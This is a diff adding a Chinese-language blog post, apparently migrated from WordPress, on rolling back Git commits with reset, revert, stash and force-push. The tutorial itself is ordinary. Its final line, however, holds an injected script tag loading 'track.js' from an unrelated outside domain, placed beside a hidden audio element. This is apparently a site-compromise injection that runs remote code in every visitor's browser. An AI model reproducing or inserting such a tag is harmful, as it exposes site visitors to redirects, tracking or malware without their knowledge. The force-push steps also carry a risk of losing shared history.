@@ -1,0 +1,174 @@
+---
+layout: post
+title: Git 代码版本回退
+date: 2020-05-18 19:49:18.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Java
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2020/05/18/git-%e4%bb%a3%e7%a0%81%e7%89%88%e6%9c%ac%e5%9b%9e%e9%80%80/"
+---
+<p>两种情况（场景）</p>
+<hr />
+<p><strong>情况一 </strong><br />
+代码还只在本地，未push到运程仓库，想把代码还原到上一次commit的代码，此时操作为代码撤销</p>
+<p>解决方案：</p>
+<div class="cnblogs_Highlighter sh-gutter">
+<div>
+<div id="highlighter_362395" class="syntaxhighlighter  java">
+<table border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="gutter">
+<div class="line number1 index0 alt2">1</div>
+</td>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="java plain">git reset [--hard|soft|mixed|merge|keep] [commit|HEAD]</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<p><strong>情况二</strong><br />
+代码已经push到运程仓库，想把代码还原到上一次提交，此时操作为代码回滚</p>
+<p>解决方案：</p>
+<p><strong>1）</strong>先<code>查看git提交日志，找到上次提交的信息，输入命令 git log (查看全部日志)或 git log -xx(查看最近xx条日志)</code></p>
+<div class="cnblogs_code">
+<pre>$ git log -3
+
+commit 4dc08bb8996a6ee02f
+Author: Mark &lt;xxx@xx.com&gt;
+Date:   Wed Sep 7 08:08:53 2016 +0800
+
+    xxxxx
+
+commit 9cac9ba76574da2167
+Author: xxx&lt;xx@qq.com&gt;
+Date:   Tue Sep 6 22:18:59 2016 +0800
+
+    improved the requst
+
+commit e377f60e28c8b84158
+Author: xxx&lt;xxx@qq.com&gt;
+Date:   Tue Sep 6 14:42:44 2016 +0800
+
+    changed the password from empty to max123</pre>
+</div>
+<p>可以看到，我标红的就是commit的ID标识，所以为了更好区分你每次代码提交标识，建议每次提交时给到Tag（提交信息）。</p>
+<p><strong>2）</strong>回滚到指定的版本（hard后面接的是上面标红的ID,也就是想回滚到的版本）</p>
+<div class="cnblogs_Highlighter">
+<div class="cnblogs_Highlighter sh-gutter">
+<div>
+<div id="highlighter_505794" class="syntaxhighlighter  java">
+<table border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="gutter">
+<div class="line number1 index0 alt2">1</div>
+<div class="line number2 index1 alt1">2</div>
+<div class="line number3 index2 alt2">3</div>
+<div class="line number4 index3 alt1">4</div>
+<div class="line number5 index4 alt2">5</div>
+</td>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="java plain">## 回退到指定版本，不保留原更改代码</code></div>
+<div class="line number2 index1 alt1"><code class="java plain">git reset --hard e377f60e28c8b84158</code></div>
+<div class="line number3 index2 alt2"></div>
+<div class="line number4 index3 alt1"><code class="java plain">## 回退到指定版本，保留原更改代码，且生成新的提交</code></div>
+<div class="line number5 index4 alt2"><code class="java plain">git revert e377f60e28c8b84158     </code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+</div>
+<p><strong>3）</strong>强制提交（这个时候已经将代码回退了，你现在的分支状态就处于你上一步指向的版本）</p>
+<div class="cnblogs_Highlighter sh-gutter">
+<div>
+<div id="highlighter_144447" class="syntaxhighlighter  java">
+<table border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="gutter">
+<div class="line number1 index0 alt2">1</div>
+</td>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="java plain">git push -f origin master</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<p><strong>4）</strong>如果你只是误提了代码，想保留代码改动的话，那就在<strong>2）</strong>的时候使用revert 命令，而不是reset,两者区别如下：</p>
+<ul>
+<li><strong>revert </strong>是放弃指定提交的修改，但是会生成一次新的提交，需要填写提交注释，以前的历史记录都在；</li>
+<li><strong>reset</strong>是指将HEAD指针指到指定提交，历史记录中不会出现放弃的提交记录。</li>
+</ul>
+<hr />
+<p>补充场景：误将其他分支代码合到自己分支且代码已提交到远端</p>
+<p><strong>思路</strong>：</p>
+<p>先将代码回滚到上一次提交，这样原本提交到远端的代码就会被撤销并在本地重新生成一次提交，接着将想提交的代码修改完后，暂存到本地存起来，接着切换到主分支将主分支代码拉下来保持其代码一致，随后删除掉原本提交代码的分支，重新新建一个分支，接着将原本暂存的代码拿出来，提交到新分支上，结束！</p>
+<p><strong>解决步骤</strong>：</p>
+<div class="cnblogs_Highlighter sh-gutter">
+<div>
+<div id="highlighter_811293" class="syntaxhighlighter  cpp">
+<table border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="gutter">
+<div class="line number1 index0 alt2">1</div>
+<div class="line number2 index1 alt1">2</div>
+<div class="line number3 index2 alt2">3</div>
+<div class="line number4 index3 alt1">4</div>
+<div class="line number5 index4 alt2">5</div>
+<div class="line number6 index5 alt1">6</div>
+<div class="line number7 index6 alt2">7</div>
+<div class="line number8 index7 alt1">8</div>
+<div class="line number9 index8 alt2">9</div>
+<div class="line number10 index9 alt1">10</div>
+</td>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="cpp plain">git status                    查看当前分支状态</code></div>
+<div class="line number2 index1 alt1"><code class="cpp plain">git </code><code class="cpp functions bold">log</code>                       <code class="cpp plain">查看提交历史</code></div>
+<div class="line number3 index2 alt2"><code class="cpp plain">git reset  ***           　　　根据提交历史ID回滚代码至上一次提交（参考上文）</code></div>
+<div class="line number4 index3 alt1"><code class="cpp plain">git stash                     将回滚后的代码，暂存到本地仓库</code></div>
+<div class="line number5 index4 alt2"><code class="cpp plain">git checkout master   　　　　 将当前分支切换至master主分支</code></div>
+<div class="line number6 index5 alt1"><code class="cpp plain">git pull                      将master的代码拉至本地，保持当前代码是正式环境运行代码</code></div>
+<div class="line number7 index6 alt2"><code class="cpp plain">git branch -d ***(原本提交代码的分支名)  删除本地原分支</code></div>
+<div class="line number8 index7 alt1"><code class="cpp plain">git checkout -b ***     　　   新建一个新的分支且切到分支上</code></div>
+<div class="line number9 index8 alt2"><code class="cpp plain">git stash pop              　　将暂存至本地仓库的代码取出来</code></div>
+<div class="line number10 index9 alt1"><code class="cpp plain">git push --force           　　将代码强制发布</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<p><audio style="display: none;" controls="controls"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
